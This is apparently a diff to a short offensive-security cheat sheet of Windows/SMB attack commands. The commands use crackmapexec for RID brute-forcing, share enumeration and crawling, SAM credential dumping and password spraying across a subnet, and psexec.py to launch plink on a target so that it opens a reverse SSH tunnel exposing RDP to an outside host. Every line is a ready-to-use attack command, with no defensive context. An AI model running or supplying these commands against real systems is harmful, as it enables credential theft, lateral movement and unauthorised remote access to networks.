@@ -11,6 +11,7 @@ crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --rid-brute
 crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --local-auth --shares
 crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --local-auth --sam
 crackmapexec smb 10.21.16.0/24 -u 'users.txt' -p cul_spray.txt
+crackmapexec smb IP -u user -p pass --shares --M spider_plus
 
 # psexec
 psexec.py 'user_ssh:pass_ssh'@'ip' "C:\plink.exe -batch -hostkey 'hostkey' -N -R 9090:127.0.0.1:3389 'IP_A' -P 1473 -l 'USUARIO' -pw 'PASSWORD_A'"
